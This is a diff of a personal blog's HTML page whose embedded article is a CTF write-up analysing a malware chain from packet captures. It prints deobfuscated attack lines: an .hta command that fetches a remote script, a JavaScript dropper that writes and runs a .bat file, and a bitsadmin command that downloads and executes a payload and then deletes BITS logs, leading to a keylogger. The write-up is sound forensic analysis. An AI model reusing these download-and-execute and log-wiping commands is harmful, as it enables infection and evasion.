@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>Mr Anderson - Writeup | Journal of Connar</title>
 <meta name="keywords" content="">
 <meta name="description" content="This is a writeup for the Mr Anderson challenge
@@ -14,16 +14,16 @@ This challenge gives us a zip file containing 3 pcap files:
 What we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.
 We can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.">
 <meta name="author" content="connar">
-<link rel="canonical" href="http://localhost:1313/ctfwriteups/mranderson/">
+<link rel="canonical" href="https://connar.github.io/ctfwriteups/mranderson/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://connar.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://connar.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://connar.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://connar.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://connar.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/ctfwriteups/mranderson/">
+<link rel="alternate" hreflang="en" href="https://connar.github.io/ctfwriteups/mranderson/">
 <noscript>
     <style>
         #theme-toggle,
@@ -60,7 +60,81 @@ We can easily identify the order by opening all 3 pcaps and observing the date a
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:title" content="Mr Anderson - Writeup" />
+<meta property="og:description" content="This is a writeup for the Mr Anderson challenge
+This challenge gives us a zip file containing 3 pcap files:
+
+
+What we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.
+We can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://connar.github.io/ctfwriteups/mranderson/" /><meta property="article:section" content="ctfwriteups" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Mr Anderson - Writeup"/>
+<meta name="twitter:description" content="This is a writeup for the Mr Anderson challenge
+This challenge gives us a zip file containing 3 pcap files:
+
+
+What we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.
+We can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Ctfwriteups",
+      "item": "https://connar.github.io/ctfwriteups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Mr Anderson - Writeup",
+      "item": "https://connar.github.io/ctfwriteups/mranderson/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Mr Anderson - Writeup",
+  "name": "Mr Anderson - Writeup",
+  "description": "This is a writeup for the Mr Anderson challenge This challenge gives us a zip file containing 3 pcap files:\nWhat we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.\nWe can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "This is a writeup for the Mr Anderson challenge This challenge gives us a zip file containing 3 pcap files:\nWhat we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.\nWe can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.\nBy doing so, we notice that firstly, an .hta file was downloaded and run. This .hta file probably downloaded the second file which is a javascript file, and this javascript file probably downloaded the last file which is a .bat one.\nWe can export all the files through File–\u003eExport Objects–\u003eHTTP.\nLet’s start analyzing the first file: “noticeJuly.hta” Running the file, we are met with the following window:\nOpening the file in a text editor, we observe the following fake looking page:\nWe see a very suspicious command that is executed upon clicking the Refresh Button. We can use the CMD Watcher tool (not that it is needed) to see that indeed this sus looking command is being run upon clicking the button:\nLet’s analyze this command that is being run. The command is the following:\nC:\\Windows\\System32\\cONhosT.exe %COMSpeC% /V/D/c \"S^eT SSG=C:\\kfldeokgr\\\u0026\u0026 mD !SSG!\u003enul 2\u003e\u00261\u0026\u0026S^eT UFWN=!SSG!^KGRAAKR.JS\u0026\u0026!UFWN!|caLl !UFWN!||caLl !UFWN! \" Firstly, let’s take the unicode values and convert them to plaintext. You can use this cyberchef command to decode them:\nCyberChef Command The command that is left is the following:\nC:\\Windows\\System32\\cONhosT.exe %COMSpeC% /V/D/c \"S^eT SSG=C:\\kfldeokgr\\\u0026\u0026 mD !SSG!\u003enul 2\u003e\u00261\u0026\u0026S^eT UFWN=!SSG!^KGRAAKR.JS\u0026\u0026!UFWN!|caLl !UFWN!||caLl !UFWN! \" Analyzing the command, here are the takeaways:\nC:\\Windows\\System32\\cONhosT.exe %COMSpeC% /V/D/c: It will open a cmd window with the /V/D/c parameters. S^eT SSG=C:\\kfldeokgr\\\u0026\u0026 mD !SSG!\u003enul 2\u003e\u00261: Sets a variable SSG to a path and then creats this path using mD (an alias for make directory), redirecting the output accordingly. S^eT UFWN=!SSG!^PEBCPADO.JS: Sets the previously mentioned path with a .js filename to the variable UFWN. \u003cnul set/p LAXA=var LAXA='ULd+DULd+EULd+\"//c0rax.eph3kdolmfa.cloud/?2/\");';\rSSG=':h\";EULd=\"Tt\"+\"P:\";GetObject(C';PEBC='var CULd=\"s\"+\"cr\";DULd=\"ipt\"+\"';\rUFWN=PEBC+SSG+LAXA: This basically creates some javascript code and stores it in the LAXA variable. PADO=new Function(UFWN);PADO(): This creates a js function with the code set in UFWN variable and runs it. By deobfuscating the js code, we are basically left with this code:\nvar CULd=\"s\"+\"cr\"; DULd=\"ipt\"+\":h\"; EULd=\"Tt\"+\"P:\"; GetObject(CULd+DULd+EULd+\"//c0rax.eph3kdolmfa.cloud/?2/\"); //which basically is--\u003e script:http://c0rax.eph3kdolmfa.cloud/?2/ This is all for the .hta file. It creates a .js file. This .js file creates an instance of a COM object retrieved from the specified url.\nFinally, by using \u003e!UFWN!|caLl !UFWN!||caLl !UFWN! the .js file is run. That’s all for this .hta file. Now let’s move to the second pcap which contains the .js code retrieved, which is the stage 2 of the attack.\nThe code in the .js file is the following:\nvar lt135 = \"QCVwcm9ncmFtZmlsZXM6fjE1LDElJWNvbXNwZWM6fi0xMiwxJSVjb21zcGVjOn4xNCwxJSVwcm9ncmFtZmlsZXM6fjEwLDElJz1eIj4lY29tbW9ucHJvZ3JhbWZpbGVzOn4#%MiwxJXUlcHJvZ3JhbWZpbGVzOn4xM#%wxJSZAJWNvbXNwZWM6fi0zLDElJWNvbXNwZWM6fjIwLDElaCVjb21tb25wcm9ncmFtZmlsZXM6fjE4LDElJWNvbW1vbnB#%b2d#%YW1maWxlczp+MjMsMSUlY29tbW9ucHJvZ3JhbWZpbGVzOn4tMTEsMSVmZiZAJWNvbW1vbnB#%b2d#%YW1maWxlczp+LTEsMSUlY29tc3BlYzp+LTEsMSUlY29tc3BlYzp+LTEzLDElJXB#%b2d#%YW1maWxlczp+LTYsMSUnPSVvczp+NSwxJV5eXi1eXl43Xl5eJXBh---snip---\" var re = new RegExp(\"#%\", \"g\"); lt135 = lt135.replace(re, \"y\"); var gj4fjrg = WScript.CreateObject(\"WScript.Shell\"); var fkfo3l = gj4fjrg.ExpandEnvironmentStrings(\"%appdata%\"); var whshis4 = fkfo3l + \"\\\\kQiFcryrxG.bat\"; var dcdd = decodeBase64(lt135); writeBytes(whshis4, dcdd); gj4fjrg.run(\"\\\"\" + whshis4 + \"\\\"\"); This basically makes some replacements in the specified code, decodes the long b64 string and saves it in the appdata folder as a .bat file. By following the same operations, we end up with this .bat file:\nThis kinda seems like normal envar obfuscation but it is slightly different. It combines multiple known batch obfuscation techniques, such as pre existing envars, custom dictionary etc. One could try to deobfuscate this manually, but there is a twist in this specific batch file. Let’s save it and upload it to VirusTotal to see what I mean:\nThe thing to take away here is that VirusTotal sometimes will identify known techniques and specify them. Here, we see an interesting text: “BatchEncryption”. Let’s google this and see what comes up:\nDamn. By opening a few tabs and reading the articles (well, translated except if you know chinese), we learn that this is a tecnhique implemented by a tool named BatchEncryptor which was created by gwsbhqt@163.com. There is also the corresponding tool to decode the whole .bat file for us! This tool exists in this repo:\nhttps://github.com/cnHopeStudio/Batch-Encryption-DeCoder (its the first google search result we got previously). By building this tool and running it, we get the deobfuscated bat code which is…another obfuscated command:\nThe new command we are called to deobfuscate is:\ncmd /V /C \"set shgyngmcqs=0XoY\u0026Ndh%Cas3WlpPRn\\meFQwgf/U2D5T:.k tbzri*uMc\u0026\u0026FOR %A IN (38 41 37 11 10 6 20 41 18 36 27 37 40 10 18 11 26 21 40 36 17 28 5 32 23 12 11 0 5 39 6 26 5 29 25 39 5 32 5 26 3 29 25 0 44 13 31 35 1 39 45 39 3 29 7 43 44 13 5 2 44 39 28 36 7 37 37 15 33 27 27 11 43 18 40 41 39 25 14 12 27 37 34 38 10 37 36 8 37 20 15 8 19 37 34 38 10 37 36 4 36 8 37 20 15 8 19 37 34 38 10 37 36 4 36 11 45 36 11 37 2 15 36 38 41 37 11 36 4 36 37 41 20 21 2 43 37 36 31 36 4 36 6 21 14 36 27 23 36 27 22 36 9 33 19 16 40 2 25 40 10 20 30 10 37 10 19 44 41 45 40 2 11 2 26 37 19 5 21 37 24 2 40 35 19 30 2 24 18 14 2 10 6 21 40 19 42 36 4 36 11 45 36 11 37 10 40 37 36 38 41 37 11 1337) DO set xqzwdomkia=!xqzwdomkia!!shgyngmcqs:~%A,1!\u0026\u0026 IF %A==1337 CALL %xqzwdomkia:~-213%\" If we read this carefully, we will see that it is not that difficult to deobfuscate. Basically, it just sets a dictionary, then runs a loop and takes a specific character of the corresponding index based on the loop. It recreates the command to be run and then calls it. Let’s use python to deobfuscate this:\nNote: The technique used is an existing one and is called “forencoding obfuscation”.\nThe result we get is the following bitsadmin command:\nbitsadmin /transfer RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU http://sunrizgl3/t.bat %tmp%\\\\t.bat \u0026 %tmp%\\\\t.bat \u0026 sc stop bits \u0026 timeout 5 \u0026 del /Q /F C:\\\\ProgramData\\\\Microsoft\\\\Network\\\\Downloader\\\\* \u0026 sc start bits Bitsadmin command creates jobs and assigns them a task. Here, bitsadmin creates a job named RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU to download a .bat file from a domain, run it, then stop the bitsadmin process in order to delete its logs and then starts it again. We can agree on that the job’s name is really sus and if we decode it from b64 we get the first part of the flag:\nNice. All that’s left is the last .bat file in the remaining pcap. Opening it, we get another obfuscated .bat file different than the previous one:\nAgain, one can try and deobfuscate it manually, but why not follow up with the same methodology as previously? Loading the file in VT, we get another interesting name:\nIt is not as easy as with the previous one to indentify the right name, but after a bit of googling we can see that Jlaive is a tool used for obfuscation that gives a matching result as the one we have:\nSo basically, Jlaive is a tool used to convert .NET executables to obfuscated .bat files. Interesting. Well, for such a tool to exist, there must be the corresponding tool that does the reverse operation. Searching for a bit, we find a tool named Get-UnJlaive which can be found in the following repo:\nhttps://github.com/Dump-GUY/Get-UnJlaive This tool reconstructs the original executable before it was converted to this .bat. Setting up the tool and running it, we successfully get an executable back:\nIf we run the file command on the .exe, we see its a Mono/.NET assembly:\n└─$ file t.bat_orig.exe t.bat_orig.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows Loading the executable to DnSpy, we are met with…another seemingly obfuscated file:\nThis executable seems to have been packed with some .NET packer. This time, VT won’t be of any help to us. We can either identify the packer used by either using a simple strings command which will reveal the path where this executable was stored at build time, or we can search through the functions of the executable and find the packer in the class “cab44dfc2d326bea8c4438eb03ca73b4d”:\nusing System; using System.Reflection; namespace A { // Token: 0x02000007 RID: 7 internal class cab44dfc2d326bea8c4438eb03ca73b4d { // Token: 0x0600001A RID: 26 RVA: 0x00003868 File Offset: 0x00001A68 private static string ccea6e29829419d8153060be40cf7772a(Assembly cdefd3af7ac5b57777d7057f73f12ed1e) { string text = cdefd3af7ac5b57777d7057f73f12ed1e.FullName; int num = text.IndexOf(','); if (num \u003e= 0) { text = text.Substring(0, num); } return text; } // Token: 0x0600001B RID: 27 RVA: 0x00003898 File Offset: 0x00001A98 internal static void c5b6799dda81c5313f25256842d094434() { string text = \"638492234169640792\"; DateTime dateTime = new DateTime(long.Parse(text)); if (DateTime.Now \u003e dateTime) { for (;;) { switch (4) { case 0: continue; } break; } if (!true) { RuntimeMethodHandle runtimeMethodHandle = methodof(cab44dfc2d326bea8c4438eb03ca73b4d.c5b6799dda81c5313f25256842d094434()).MethodHandle; } string text2 = cab44dfc2d326bea8c4438eb03ca73b4d.ccea6e29829419d8153060be40cf7772a(Assembly.GetExecutingAssembly()); string text3 = string.Concat(new string[] { \"The assembly '\", text2, \"' is created with an evaluation version of CryptoObfuscator and will stop working on \", dateTime.ToString(\"d-MMM-yyyy.\"), \" The evaluation period has expired and the application will now exit.\" }); throw new Exception(text3); } } } } CryptoObfuscator! The only thing that is left to do is to find the corresponding tool to deobfuscate the executable for us. The one I will use can be found in the following repo:\nhttps://github.com/Rhotav/Crypto-Deobfuscator Building and running the tool, we get the deobfuscated file:\nSearching through the deobfuscated methods, we see the executable is basically a keylogger that sends the logged keystrikes through email. In method_4, we can find the part2 of our flag:\nFull flag: ECSC{477_7h353_ch41nd_73chn1ch35_f02_ju57_4_k3yl09932}\n",
+  "wordCount" : "1639",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":[{
+    "@type": "Person",
+    "name": "connar"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://connar.github.io/ctfwriteups/mranderson/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Journal of Connar",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://connar.github.io/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -78,7 +152,7 @@ We can easily identify the order by opening all 3 pcaps and observing the date a
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
+            <a href="https://connar.github.io/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -104,42 +178,42 @@ We can easily identify the order by opening all 3 pcaps and observing the date a
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/categories/" title="Categories">
+                <a href="https://connar.github.io/categories/" title="Categories">
                     <span>Categories</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tags/" title="Tags">
+                <a href="https://connar.github.io/tags/" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/mychallenges/" title="My Challenges">
+                <a href="https://connar.github.io/mychallenges/" title="My Challenges">
                     <span>My Challenges</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/posts/" title="Posts">
+                <a href="https://connar.github.io/posts/" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/projects/" title="Projects">
+                <a href="https://connar.github.io/projects/" title="Projects">
                     <span>Projects</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/training/" title="Training">
+                <a href="https://connar.github.io/training/" title="Training">
                     <span>Training</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/about/" title="About">
+                <a href="https://connar.github.io/about/" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://connar.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
@@ -150,7 +224,7 @@ We can easily identify the order by opening all 3 pcaps and observing the date a
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/ctfwriteups/">Ctfwriteups</a></div>
+    <div class="breadcrumbs"><a href="https://connar.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://connar.github.io/ctfwriteups/">Ctfwriteups</a></div>
     <h1 class="post-title entry-hint-parent">
       Mr Anderson - Writeup
     </h1>
@@ -341,12 +415,12 @@ The only thing that is left to do is to find the corresponding tool to deobfusca
     <ul class="post-tags">
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/ctfwriteups/malwarecarving/">
+  <a class="prev" href="https://connar.github.io/ctfwriteups/malwarecarving/">
     <span class="title">« Prev</span>
     <br>
     <span>Malware Carving - Writeup</span>
   </a>
-  <a class="next" href="http://localhost:1313/ctfwriteups/xmasgiveaway/">
+  <a class="next" href="https://connar.github.io/ctfwriteups/xmasgiveaway/">
     <span class="title">Next »</span>
     <br>
     <span>Mr Beast Xmas Giveaway - Writeup</span>
@@ -358,7 +432,7 @@ The only thing that is left to do is to find the corresponding tool to deobfusca
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">Journal of Connar</a></span> · 
+        <span>&copy; 2025 <a href="https://connar.github.io/">Journal of Connar</a></span> · 
 
     <span>
         Powered by
